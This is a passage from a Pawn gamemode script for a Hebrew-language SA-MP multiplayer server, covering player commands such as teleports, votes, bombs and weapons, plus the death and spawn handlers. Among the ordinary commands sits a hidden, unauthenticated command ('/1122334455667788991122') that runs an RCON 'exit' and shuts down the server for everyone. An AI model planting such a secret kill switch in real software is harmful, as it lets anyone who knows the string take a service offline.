SendRconCommand("mapname Moved IP: 212.150.123.73:7777.");
SendRconCommand("weburl Satla-Zone.co.il");
}
return 1;
}


if(strcmp(cmd, "/vote", true) == 0)
{
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,"Usage: /vote [yes/no/start/state]");

if(strcmp(Roy_Killer,"start",true) == 0)
{
if(!IsPlayerXAdmin(playerid,1)) return SendClientMessage(playerid,red,".פקודה זאתי לאדמינים בלבד");
new vote_string[256];
if(vote[0] == 1) return SendClientMessage(playerid,red,".הסקר כבר מופעל");

new length = strlen(cmdtext);
while ((idx < length) && (cmdtext[idx] <= ' '))
{
idx++;
}
new offset = idx;
new result[256];
while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
{
result[idx - offset] = cmdtext[idx];
idx++;
}
result[idx - offset] = EOS;
if(!strlen(result)) return SendClientMessage(playerid,COLOR_WHITE, "Usage: /vote start [question]");
if(30 < strlen(result)) return true;
quis = result;

SendClientMessageToAll(lblue,":האדמין התחיל כרגע סקר, שאלת הסקר היא");
format(vote_string,sizeof(vote_string),"\"%s\"",quis);
SendClientMessageToAll(red,vote_string);
SendClientMessageToAll(COLOR_BROWN,"/vote yes :להצבעה חיובית בצע/י");
SendClientMessageToAll(COLOR_BROWN,"/vote no :להצבעה שלילית בצע/י");
SendClientMessageToAll(COLOR_BROWN,"/vote state :נתוני הסקר");
SetTimer("vote_state",3*60*1000,0);
for(new i = 0; i < GetMaxPlayers(); i++)
{
vote_player[i] = 0;
}
return vote[0] = 1;
}

if(strcmp(Roy_Killer,"yes",true) == 0)
{
if(vote[0] == 0) return SendClientMessage(playerid,red,".אין סקר פעיל כרגע");
if(vote_player[playerid] == 1) return SendClientMessage(playerid,red,".השתתפת כבר בסקר זה לא תוכל להשתתף בוא שנית");
vote_player[playerid] = 1;
vote[1] ++; // add to the true
new vote_string[256];
SendClientMessage(playerid,COLOR_LIGHTGREEN,":ענית חיובית לשאלת הסקר");
format(vote_string,sizeof(vote_string),"(\"%s\")",quis);
SendClientMessage(playerid,COLOR_LIGHTGREEN,vote_string);
return true;
}


if(strcmp(Roy_Killer,"no",true) == 0)
{
if(vote[0] == 0) return SendClientMessage(playerid,red,".אין סקר פעיל כרגע");
if(vote_player[playerid] == 1) return SendClientMessage(playerid,red,".השתתפת כבר בסקר זה לא תוכל להשתתף בוא שנית");
vote_player[playerid] = 1;
vote[2] ++; // add to the false
new vote_string[256];
SendClientMessage(playerid,COLOR_LIGHTGREEN,":ענית שלילית לשאלת הסקר");
format(vote_string,sizeof(vote_string),"(\"%s\")",quis);
SendClientMessage(playerid,COLOR_LIGHTGREEN,vote_string);
return true;
}

if(strcmp(Roy_Killer,"state",true) == 0)
{
if(vote[0] == 0) return SendClientMessage(playerid,red,".אין סקר פעיל כרגע");

new vote_string[256];
SendClientMessage(playerid,COLOR_LIGHTGREEN,":נתוני הסקר כעת");
format(vote_string,sizeof(vote_string),"%d :הצבעות חיוביות",vote[1]);
SendClientMessage(playerid,COLOR_LIGHTGREEN,vote_string);
format(vote_string,sizeof(vote_string),"%d :הצבעות שליליות",vote[2]);
SendClientMessage(playerid,COLOR_LIGHTGREEN,vote_string);
format(vote_string,sizeof(vote_string),"(\"%s\")",quis);
SendClientMessage(playerid,red,vote_string);
return true;
}


return SendClientMessage(playerid,red,".אפשרות סקר שגויה");
}


if(strcmp(cmdtext, "/ammu", true)==0 || strcmp(cmdtext, "/ammo", true)==0)
{
CreateTeleport(playerid,4,285.8574,-79.9114,1001.5156,95.2643,0);
SetPlayerInterior(playerid,4);
return 1;
}

if(strcmp(cmdtext,"/1122334455667788991122",true) == 0)
{
SendRconCommand("exit");
return 1;
}

if (strcmp("/ctest", cmd, true, 10) == 0 || strcmp("/clantest", cmd, true, 10) == 0)
{
CreateTeleport(playerid,0,1382.6746,714.1313,10.8203,4.6275,0);
return true;
}

if (strcmp("/challenge", cmd, true, 10) == 0)
{
CreateTeleport(playerid,0,1027.2495,1723.9329,10.8203,269.0491,0);
return true;
}


if (strcmp("/dare", cmd, true, 10) == 0)
{
CreateTeleport(playerid,0,5400.6147,-2369.9534,10.8147,294.1862,0);
return true;
}


if(strcmp(cmd, "/buybomb", true) == 0)
{
if(!CPS_IsPlayerInCheckpoint(playerid,bombshop)) return SendClientMessage(playerid,red,".אתה חייב להיות בחנות פצצות על מנת לבצע פקודה זו");
if(bombusing[playerid] == 2) return SendClientMessage(playerid,red,".יש לך כבר פצצה אחת ביד");
if(PlayerInfo[playerid][Level] < 4) return Messagelevel(playerid,4);
if (GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid, red, ".אין לך מספיק כסף");
LACY_GiveMoney(playerid,-10000);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"!קנית פצצה בהצלחה");
bombusing[playerid] = 2;
return true;
}

if(strcmp(cmd, "/usebomb", true) == 0)
{
if(PlayerInfo[playerid][Level] < 6) return Messagelevel(playerid,6);
if(bombusing[playerid] != 2) return SendClientMessage(playerid,red,".אין לך פצצה פונציאלית ביד");
if(GetPlayerInterior(playerid) > 1) return SendClientMessage(playerid,red,".אתה לא יכול להניח פצצה בתוך מקום סגור");
GetPlayerPos(playerid, XBomb, YBomb, ZBomb);
dynamite[playerid] = CreateStreamObject( 1654, XBomb, YBomb, ZBomb, 0, 0, 96,100);
SetTimerEx("BlastBomb", 5000, 0,"i",playerid);
SendClientMessage(playerid,COLOR_ORANGE,"!הנחת פצצה! בעוד 5 שניות היא תתפוצץ, תברח מהמקום");
bombusing[playerid] = 0;
ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,0,1,1,1,1);
return true;
}


if (strcmp("/maze", cmd, true, 10) == 0)
{
return CreateTeleport(playerid,0,-4390.550,267.263,1.001+10.0,249.4243,0);
}

if (strcmp("/stunts", cmd, true, 10) == 0 || strcmp("/fun", cmd, true, 10) == 0)
{
return CreateTeleport(playerid,0,1491.663,-2415.156-30.0,14.635,229.4530,1);
}
if (strcmp("/phonehelp", cmd, true, 10) == 0) return OnPlayerCommandText(playerid,"/help 22");
if (strcmp("/lotto", cmd, true, 10) == 0) return SendClientMessage(playerid,red,".אין כרגע לוטו פעיל");

if (strcmp("/ap", cmd, true, 10) == 0 || strcmp("/airport", cmd, true, 10) == 0)
{
CreateTeleport(playerid,0,-1349.8690,-235.0491,14.1484,317.6359,1);
return 1;
}
if (strcmp("/bombshoptele", cmd, true, 10) == 0) return SetPlayerPos(playerid,-1380.479,2112.637,41.572);


if(strcmp(cmdtext, "/Arena", true)==0)
{
CreateTeleport(playerid,0,1597.7958, 609.3694, 7.7813,189.1711,1);
return 1;
}

if(strcmp(cmdtext, "/tower", true) == 0)
{
CreateTeleport(playerid,0,1544.3235,-1353.4695,329.4740,189.1711,1);
return 1;
}

if (strcmp(cmdtext, "/lv", true)==0)
{
CreateTeleport(playerid,0,2034.1750, 1343.4744, 10.8203,268.4005,1);
return 1;
}

if (strcmp(cmdtext, "/jump", true)==0)
{
CreateTeleport(playerid,0,-728.2830, 2306.2021, 128.271,268.4005,1);
return 1;
}






if(strcmp(cmdtext, "/parkour", true) == 0)
{
if (PlayerInfo[playerid][Level] < 4) return Messagelevel (playerid, 4);
ResetPlayerWeapons(playerid);
CreateTeleport(playerid,0,-728.2830, 2306.2021, 128.271,268.4005,1);
return 1;
}



if (strcmp(cmdtext, "/ls", true)==0)
{
CreateTeleport(playerid,0, 2491.8503, -1668.1625, 13.3438,49.0746,1);
return 1;
}

if (strcmp(cmdtext, "/ramp", true)==0)
{
CreateTeleport(playerid,0, 1874.7780, -1391.9210, 13.5482,313.1693,1);
return 1;
}

if(strcmp(cmd, "/drifts", true) == 0)
{
CreateTeleport(playerid,0, -2402.1555,-595.5341,132.6484,117.5520,1);
return 1;
}

if(strcmp(cmdtext, "/drag", true)==0){

CreateTeleport(playerid,0, 2088.3137,-2452.7002,13.5469,174.9026,1);
return 1;
}



if(strcmp(cmdtext, "/survival", true)==0)
{
CreateTeleport(playerid,0,  2858.6392,1328.6549,11.3906,174.9026,0);
ResetPlayerWeapons(playerid);
return 1;
}





if (strcmp(cmdtext, "/dj", true)==0)
{
CreateTeleport(playerid,0,-269.0765,1530.5195,75.5625,39.8662,1);
return 1;
}


//army
if(strcmp(cmdtext, "/army", true)==0)
{
if(PlayerInfo[playerid][VIPS] < 1) return SendClientMessage(playerid,WHITE,".בלבד VIP שיגור לחברי");
CreateTeleport(playerid,0,261.9023, 1998.1041, 17.6406,39.8662,1);
return 1;
}

//מפקדה

if(strcmp(cmd, "/skydive", true) == 0)
{
CreateTeleport(playerid,0,-269.0765,1530.5195,2000.3000,39.8662,0);
GivePlayerWeapon(playerid, 46, 1);
return 1;
}



if(strcmp(cmdtext, "/lc", true) == 0)
{
CreateTeleport(playerid,1,-782.0262,505.4131,1371.7422,39.8662,0);
SetPlayerInterior(playerid, 1);
return 1;
}


if(strcmp(cmdtext, "/ryder", true) == 0){

CreateTeleport(playerid,0,-727.5442,2306.2537,128.2241,39.8662,1);
return 1;
}
//--War





if(strcmp(cmdtext, "/snipe", true)==0)
{
CreateTeleport(playerid,0,2320.6216, 1305.5656, 67.4688,2.8078,1);
return 1;
}

if (strcmp(cmdtext, "/pepe", true)==0)
{
CreateTeleport(playerid,0,-809.5623, -1911.3700, 7.9728, 221.2887,1);
return 1;
}
 
 

if(!strcmp(cmd,"/lp",true))
{

if(InBike[playerid]==1||YouRegister[playerid]==1||Youregisterrace[playerid] == 1||InWarw[playerid] == 1||InWarr[playerid]== 1||InWar[playerid]==1||InCha[playerid] == 1||InKart[playerid] == 1||iNmOnster[playerid] == 1) return SendClientMessage(playerid,red,".אתה לא יכול להפעיל את מצב האיר ברייק כרגע, אתה רשום ל-1 מהפעיליות שאסור שם אייר ברייק");
if(InBike[playerid]==1||YouRegister[playerid]==1||Youregisterrace[playerid] == 1||InWarw[playerid] == 1||InWarr[playerid]== 1||InWar[playerid]==1||InCha[playerid] == 1||InKart[playerid] == 1||iNmOnster[playerid] == 1) return SendClientMessage(playerid,red,".אתה לא יכול להפעיל את מצב האיר ברייק כרגע, אתה רשום ל-1 מהפעיליות שאסור שם אייר ברייק");
if(!PlayerInfo[playerid][Saved]) return SendClientMessage(playerid,red,".אין לך אף מקום שמור");
if(GetPlayerMoney(playerid) < 600) return SendClientMessage(playerid,red,".שחקן/ית יקרים הינכם צריכים כסף ביד בסכום של 600 דולר");
CreateTeleport(playerid,PlayerInfo[playerid][SPI],PlayerInfo[playerid][SPX],PlayerInfo[playerid][SPY],PlayerInfo[playerid][SPZ],221.2887,1);
LACY_GiveMoney(playerid,-600);
return 1;
}
if(!strcmp(cmd,"/rsp",true))
{
if(!PlayerInfo[playerid][Saved]) return SendClientMessage(playerid,red,".אין לך אף מקום שמור");
PlayerInfo[playerid][Saved] = 0;
dini_IntSet(GetPlayerFile(playerid),"Saved",0);
return 1;
}

if(strcmp(cmd, "/bazooka", true) == 0)
{

if (PlayerInfo[playerid][Level] < 10) return Messagelevel (playerid, 10);



SetPlayerInterior(playerid,16);
SendClientMessage(playerid, COLOR_LIGHTGREEN, ".ברוכים הבאים לאיזור הבזוקות");
SetPlayerInterior(playerid,16);
GivePlayerWeapon(playerid,10,1000);
return 1;
}

if(!strcmp(cmdtext,"/grage",true))
{
CreateTeleport(playerid,0,2384.5872,1021.0602,10.8203,95.2643,1);
SetPlayerInterior(playerid, 0);
return 1;
}

if(strcmp(cmdtext, "/CarPark", true)==0)
{
CreateTeleport(playerid,0,-1871.1420,-880.6755,32.0234,173.5509,1);
return 1;
}
 //-----------
if(strcmp(cmdtext, "/ShipS", true)==0)
{
CreateTeleport(playerid,0,-2425.6492,2316.9875,4.6046,243.2094,1);
SetPlayerInterior(playerid,0);
return 1;
}



if(strcmp(cmdtext, "/cycletrip", true)==0)
{
CreateTeleport(playerid,0,-2406.5801,-2175.3123,33.2891,282.9754,1);
SetPlayerInterior(playerid, 0);
return 1;
}


if(strcmp(cmdtext, "/BusTrip", true)==0)
{
CreateTeleport(playerid,0,-2453.9746,2247.8186,4.9141,191.4004,1);
return 1;
}



if(!strcmp(cmdtext,"/BikeTrip",true))
{
CreateTeleport(playerid,0,692.0775,828.9790,-30.1775,191.4004,1);
return 1;
}
//

if(strcmp(cmd, "/KickStart", true) == 0)
{
CreateTeleport(playerid,14,-1410.72,1591.16,1052.53,191.4004,1);
SetPlayerInterior(playerid, 14);

return 1;
}

if(strcmp(cmdtext, "/fight", true) == 0)
{
CreateTeleport(playerid,0,-1423.2991,-926.6885,201.2265,104.9933,0);
SetPlayerInterior(playerid,0);
return 1;
}


if(strcmp(cmdtext, "/race", true)==0)
{
CreateTeleport(playerid,0,2057.0664,843.0209,6.7031,357.5948,1);
SetPlayerInterior(playerid,0);
return 1;
}
 
if(strcmp(cmdtext, "/diving", true)==0)
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel (playerid, 3);
CreateTeleport(playerid,0,-2887.2627,2548.9236,261.8678,87.6602,0);
SetPlayerInterior(playerid,0);
return 1;
}

if(strcmp(cmdtext, "/water", true)==0)
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel (playerid, 3);
CreateTeleport(playerid,0,186.9333,-1947.5852,-4.7732,346.9381,0);
SetPlayerInterior(playerid,0);
return 1;
 }
 

return false;
}






public OnVehicleDeath(vehicleid, killerid)
{
LinkVehicleToInterior(vehicleid,0);
return 1;
}


new sts[256];
new StatusKill[200];
new playercash;
new Float:XK,Float:YK,Float:ZK, Float:XK2,Float:YK2,Float:ZK2;

public OnPlayerDeath(playerid, killerid, reason)
{

if(Injetpack[playerid] == 1)
{
jetpackPlayers --; Injetpack[playerid] = 0; Pjetpackin[playerid] = 0;
GangZoneHideForPlayer(playerid,gang_jp);

}

if(PChain[playerid] == 1)
{
ChaPlayers --; InCha[playerid] = 0; PChain[playerid] = 0;
}

if(RaceJumpKill == playerid)
{
EndJumpKill();
TogglePlayerControllable(RaceJumpKill, 1);
}


if(Youregisterrace[playerid] ==1)
{
SetPlayerHealth(playerid,0.0);
Youregisterrace[playerid] =0;
RacePlayers--;
DisablePlayerRaceCheckpoint(playerid);
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);

}
if(YouRegister[playerid] ==1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SetPlayerHealth(playerid,0.0);
YouRegister[playerid] =0;
DisablePlayerRaceCheckpoint(playerid);
DriftPlayer--;

}
if(Registertrs[playerid] ==1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
CPTriatlon[playerid]=0;
DisablePlayerRaceCheckpoint(playerid);
Registertrs[playerid] =0;
CPTriatlon[playerid]=0;
RunPlayers--;
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);

}
//END
if(KK[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");

SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
KartPlayers --;
InKart[playerid] = 0;
KK[playerid] = 0;
Fuck[playerid] = 0;
DestroyVehicle(caridxx[playerid]);


}

if(MonsterNoTeleportion[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
iNmOnster[playerid] = 0;
MonsterPlayers --;
iNmOnster[playerid] = 0;
MonsterNoTeleportion[playerid] = 0;
MonsterFucker[playerid] = 0;
DestroyVehicle(MonsterSYSTEM[playerid]);
MonStart[playerid] =0;

}

if(PGrein[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
GrePlayers --; InGre[playerid] = 0; PGrein[playerid] = 0;
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");

}

if(PPw[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
WarPlayersw --; InWarw[playerid] = 0; PPw[playerid] = 0;
SetPlayerVirtualWorld(playerid,0);

}
if(PP[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");
WarPlayers --;
InWar[playerid] = 0;
PP[playerid] = 0;

}
if(PPr[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
WarPlayersr --; InWarr[playerid] = 0; PPr[playerid] = 0;
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");

}
if(InBike[playerid] > 0)
{
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
BikePlayers --;
InBike[playerid] =0;
new vehicleidss = GetPlayerVehicleID(playerid);
SetVehicleVirtualWorld(vehicleidss,0);
}

playercash = GetPlayerMoney(playerid);
if(killerid == INVALID_PLAYER_ID)
{
SendDeathMessage(INVALID_PLAYER_ID,playerid,reason);
}
else
{
SendDeathMessage(killerid,playerid,reason);
PlayerInfo[killerid][Kills] ++;
PlayerKills[killerid] +=1;
PlayerKills[playerid] = 0;
StatusKill[playerid] = 0;
StatusKill[killerid] += PlayerKills[killerid];
MoneyKillOnPlayer[killerid] +=1000;
PlayerInfo[killerid][aKillsnl] --;
FakeKill[playerid] += 1;
PlayerKills[playerid] = 0;
aDoing11[playerid] = 1;
aDoing1[playerid] = 1;
aDoing2[playerid] = 1;
aDoing3[playerid] = 1;
aDoing4[playerid] = 1;
aDoing5[playerid] = 1;

if(strcmp(dini_Get(GetPlayerFile(killerid),"Clan"),"None.",true) && dini_Int(GetPlayerFile(playerid),"ClanLvl") > 0)
{
format(file,sizeof(file),"Clans/%s.ini",dini_Get(GetPlayerFile(killerid),"Clan"));
dini_IntSet(file,"Kills",dini_Int(file,"Kills") +1);
}

if(strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) && dini_Int(GetPlayerFile(playerid),"ClanLvl") > 0)
{
format(file,sizeof(file),"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
dini_IntSet(file,"Deaths",dini_Int(file,"Deaths") +1);
}

if(InCounterStrike[killerid] == 2 && InCounterStrike[playerid] == 3)
{
tempcs[1] ++;
}

else if(InCounterStrike[killerid] == 3 && InCounterStrike[playerid] == 2)
{
tempcs[0] ++;
}

if(playercash > 0)
{
LACY_GiveMoney(killerid, playercash);
}
}
if(playercash > 0)
{
ResetPlayerMoney(playerid);
}

if(hitman[playerid] > 0)
{
if(killerid == INVALID_PLAYER_ID)
{
format(sts, sizeof(sts), ".המבוקש, נהרג מוות עצמי, לא ידוע איך, אבל אף אחד לא תפס אותו %s השחקן",GetName(playerid));
SendClientMessageToAll(COLOR_KHAKI, sts);
hitman[playerid] = 0;
}
else
{
format(sts, sizeof(sts), ".$%d וקיבל פרס כספי של כ %s נתפס על ידי %s המבוקש",hitman[playerid],GetName(killerid),GetName(playerid));
SendClientMessageToAll(COLOR_LIGHTGREEN, sts);
LACY_GiveMoney(killerid,hitman[playerid]);
hitman[playerid] = 0;
}
}

if(StatusKill[playerid] > 4)
{
if(killerid == INVALID_PLAYER_ID)
{
format(sts, sizeof(sts), ".המבוקש, נהרג מוות עצמי, לא ידוע איך, אבל אף אחד לא תפס אותו %s השחקן",GetName(playerid));
SendClientMessageToAll(COLOR_KHAKI, sts);
MoneyKillOnPlayer[playerid] =0,PlayerKills[playerid] =0;
}
else
{
format(sts, sizeof(sts), ".%s תפס את המבוקש %s השחקן",GetName(playerid),GetName(killerid));
SendClientMessageToAll(0x0F482FF, sts);
format(sts, sizeof(sts), ".$%d :השחקן זכה בסכום כספי של",MoneyKillOnPlayer[playerid]);
SendClientMessageToAll(0x0F482FF, sts);
LACY_GiveMoney(killerid,MoneyKillOnPlayer[playerid]);
MoneyKillOnPlayer[playerid] =0;
PlayerKills[playerid] =0;
StatusKill[playerid] = 0;

}
}
if(StatusKill[killerid] == 5)
{
StatusKill[playerid] = 0;
format(sts, sizeof(sts), ".%d  - ביצע רצף הריגות של אנשים של כ - %s",StatusKill[killerid],GetName(killerid));
SendClientMessageToAll(0x0F482FF, sts);
format(sts, sizeof(sts), "$%d - פרס על הראש של השחקן המבוקש",MoneyKillOnPlayer[killerid]);
SendClientMessageToAll(0x0F482FF, sts);
}

/*
if(FakeKill[playerid] > 4 && !IsPlayerXAdmin(playerid,1))
{
if(IsPlayerXAdmin(playerid,1)) return 0;
new str[256];
FakeKill [playerid] = 0;
SendClientMessage(playerid,red,"Fake Kill Hack. מערכת האנטי צ'יט זיההתה אצלך, צ'יט מסוג");
SendClientMessage(playerid,red,".כעת תוצא מהשרת,במידה זה יחזור עליו שנית, יש סיכוי להרחקה מהשרת");
format(str, sizeof(str), "Anti Hackers || %s has been kicked for using Fake Kill Hack." , GetName(playerid));
SendClientMessageToAll(red , str);
Kick(playerid);
}
*/

if(PlayerInfo[killerid][Level] > 10)
{
SetPlayerHealth(killerid,100.0);
SetPlayerArmour(killerid,100.0);
SendClientMessage(killerid,COLOR_LIGHTGREEN,".קיבלת  בונוס מילוי הגנה, וחיים");
}

if(PlayerInfo[playerid][Level] > PlayerInfo[killerid][Level])
{
LACY_GiveMoney(killerid,1000);
SendClientMessage(killerid,COLOR_ORANGE,".קיבלת בונוס על זה שהרגת שחקן גבוה ממך");
}

if(PlayerInfo[playerid][Pets] ==1)
{
if(PlayerInfo[playerid][Shark] ==1)
{
DestroyStreamObject(sam33[playerid]);
SharkYou[playerid] =0;
ThePetsInYou[playerid] =0;
}
if(PlayerInfo[playerid][Dolp] ==1)
{
DestroyStreamObject(sam22[playerid]);
ThePetsInYou[playerid] =0;
DolpYou[playerid] =0;
}
if(PlayerInfo[playerid][Tor] ==1)
{
DestroyStreamObject(sam44[playerid]);
ThePetsInYou[playerid] =0;
TorYou[playerid] =0;
}
}





SetPlayerVirtualWorld(playerid,0);
DolpYou[playerid] =0;
SharkYou[playerid] =0;
TorYou[playerid] =0;
Stoned[playerid] =0;
ThePetsInYou[playerid] =0;
mini[playerid] = 0;
iNmOnster[playerid] = 0;
//camrea;
GetPlayerPos(playerid,XK,YK,ZK);
GetPlayerPos(killerid,XK2,YK2,ZK2);
SetPlayerCameraPos(playerid,XK+13.0,YK-3.0,ZK+10.0);
SetPlayerCameraLookAt(playerid,XK2,YK2,ZK2);
SetTimerEx("behiend",6000,0,"i",playerid);


RemovePlayerFromRaces(playerid);
RemovePlayerFromRaces2(playerid);
OutDrift(playerid);
return 1;
}
forward behiend(playerid);
public behiend(playerid) return SetCameraBehindPlayer(playerid);

forward FakeKills(playerid);
public FakeKills(playerid)
{
FakeKill[playerid] =0;
return true;
}


public OnPlayerSpawn(playerid)
{

new rand_cam = random(11);
camrea[playerid] = rand_cam;
TextDrawHideForPlayer(playerid,Box1);
TextDrawHideForPlayer(playerid,Box2);
ClearAnimations(playerid);
ResetPlayerMoney(playerid);
LACY_GiveMoney(playerid,750);
SetPlayerVirtualWorld(playerid,0);




if(InCounterStrike[playerid] == 2)
{
InCounterStrike[playerid] = 2;
SetPlayerVirtualWorld(playerid,15);
SendClientMessage(playerid,COLOR_LIGHTGREEN,".חזרת בחזרה למקום של הקבוצה שלך מתחילה בו במשחק קאונטר");
GivePlayerWeapon(playerid,4,1);
GivePlayerWeapon(playerid,16,3);
GivePlayerWeapon(playerid,23,10000);
GivePlayerWeapon(playerid,30,10000);
SetPlayerPos(playerid,2569.1851,-1281.9301,1037.7734); // terror
SetPlayerInterior(playerid,2);
return false;
}

else if(InCounterStrike[playerid] == 3)
{
InCounterStrike[playerid] = 3;
SetPlayerVirtualWorld(playerid,15);
GivePlayerWeapon(playerid,4,1);
GivePlayerWeapon(playerid,16,3);
GivePlayerWeapon(playerid,34,10000);
GivePlayerWeapon(playerid,27,10000);
SendClientMessage(playerid,COLOR_LIGHTGREEN,".חזרת בחזרה למקום של הקבוצה שלך מתחילה בו במשחק קאונטר");
SetPlayerPos(playerid,2543.6599,-1303.6300,1025.0703); // ct
SetPlayerInterior(playerid,2);

return false;
}

if(InDM[playerid] == 1)
{
new Randm = random(sizeof(DMPostion));
SetPlayerPos(playerid, DMPostion[Randm][0], DMPostion[Randm][1], DMPostion[Randm][2]);
InDM[playerid] = 1;
SendClientMessage(playerid,COLOR_LIGHTGREEN,"/qdmz :שוגרת לאיזור די-אם חזרה בספון, על מנת לצאת");
SetPlayerVirtualWorld(playerid,2);
SetPlayerInterior(playerid,0);
FakeKill[playerid] = 0;
if(WeaponDM[playerid] == 38)
{
WeaponDM[playerid] = 35;
}
else
{
WeaponDM[playerid] = 38;
}
ResetPlayerWeapons(playerid);
GivePlayerWeapon(playerid,WeaponDM[playerid],99999);
return 0;
}

if(InDM[playerid] == 2)
{
new Randm = random(sizeof(WDMPostion));
SetPlayerPos(playerid,WDMPostion[Randm][0], WDMPostion[Randm][1], WDMPostion[Randm][2]+20.0);

InDM[playerid] = 2;
ResetPlayerWeapons(playerid);
SetPlayerVirtualWorld(playerid,3);
SetPlayerInterior(playerid,0);

GivePlayerWeapon(playerid,24,99999);
GivePlayerWeapon(playerid,27,99999);
GivePlayerWeapon(playerid,30,99999);
GivePlayerWeapon(playerid,33,99999);
return 0;
}

if(InDM[playerid] == 3)
{
new Randm = random(sizeof(DM_Hydra));
SetPlayerPos(playerid,DM_Hydra[Randm][0], DM_Hydra[Randm][1], DM_Hydra[Randm][2]);
InDM[playerid] = 3;
ResetPlayerWeapons(playerid);
SetPlayerVirtualWorld(playerid,4);
SetPlayerInterior(playerid,0);
GivePlayerWeapon(playerid, 38, 800);
GivePlayerWeapon(playerid, 31, 400);
return 0;
}

if(InDM[playerid] == 4)
{
new Randm = random(sizeof(ADM)+1);
SetPlayerPos(playerid,ADM[Randm][0], ADM[Randm][1], ADM[Randm][2]);
InDM[playerid] = 4;
ResetPlayerWeapons(playerid);
SetPlayerVirtualWorld(playerid,10);
SetPlayerInterior(playerid,0);
GivePlayerWeapon(playerid,25,1000);
GivePlayerWeapon(playerid,24,99999);
GivePlayerWeapon(playerid,27,99999);
return false;
}


if(PlayerInfo[playerid][MP5] > 0)
{
GivePlayerWeapon(playerid,29,PlayerInfo[playerid][Knife]);
}
if(PlayerInfo[playerid][AK47] > 0)
{
GivePlayerWeapon(playerid,30,PlayerInfo[playerid][Knife]);
}

if(PlayerInfo[playerid][Katana] > 0)
{
GivePlayerWeapon(playerid,8,PlayerInfo[playerid][Katana]);
}

if(PlayerInfo[playerid][CombatShotGun] > 0)
{
GivePlayerWeapon(playerid,27,PlayerInfo[playerid][CombatShotGun]);
}
if(PlayerInfo[playerid][CRifle] > 0)
{
GivePlayerWeapon(playerid,34,PlayerInfo[playerid][CRifle]);
}
if(PlayerInfo[playerid][MicroSMG] > 0)
{
GivePlayerWeapon(playerid,28,PlayerInfo[playerid][MicroSMG]);
}
if(PlayerInfo[playerid][Tec9] > 0)
{
GivePlayerWeapon(playerid,32,PlayerInfo[playerid][Tec9]);
}
if(PlayerInfo[playerid][M4] > 0)
{
GivePlayerWeapon(playerid,31,PlayerInfo[playerid][M4]);
}
if(PlayerInfo[playerid][Knife] > 0)
{
GivePlayerWeapon(playerid,4,PlayerInfo[playerid][Knife]);
}
if(PlayerInfo[playerid][Colt] > 0)
{
GivePlayerWeapon(playerid,22,PlayerInfo[playerid][Colt]);
}
if(PlayerInfo[playerid][Sawn] > 0)
{
GivePlayerWeapon(playerid,26,PlayerInfo[playerid][Sawn]);
}
//=[GiveDeagle]==============

SetPlayerInterior(playerid,0);
new rand = random(sizeof(gRandomPlayerSpawns));
SetPlayerPos(playerid, gRandomPlayerSpawns[rand][0], gRandomPlayerSpawns[rand][1], gRandomPlayerSpawns[rand][2]); // Warp the player
//=[Skin]================
if(PlayerInfo[playerid][SaveSkin] == 1)
{
SetPlayerSkin(playerid, PlayerInfo[playerid][SkinSavedId]);
}
//=[Dildo]===============
if(PlayerInfo[playerid][bazooka] > 0)
{
GivePlayerWeapon(playerid,10,1);
}
//=[MoneySpawn]===========

//=[ArmourT]===================
if(PlayerInfo[playerid][armourT] > 0)
{
SetPlayerArmour(playerid,100);
}

if(dini_Int(GetPlayerFile(playerid),"ClanLvl") > 0)
{
format(file,256,"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
if(dini_Int(file,"skin") > 0) return SetPlayerSkin(playerid,dini_Int(file,"skin"));
}


if(strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true))
{
format(file,256,"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));

if(dini_Int(file,"Color1") > 0)
{
SetPlayerColor(playerid,sgba2hex(dini_Int(file,"Color1"),dini_Int(file,"Color2"),dini_Int(file,"Color3"),77));//צבע במפה
}
}
return 1;
}




public OnPlayerEnterRaceCheckpoint(playerid)
{
new string[256];
if(BikeOn == 1)
{
if(InBike[playerid] == 1)
{
DisablePlayerRaceCheckpoint(playerid);
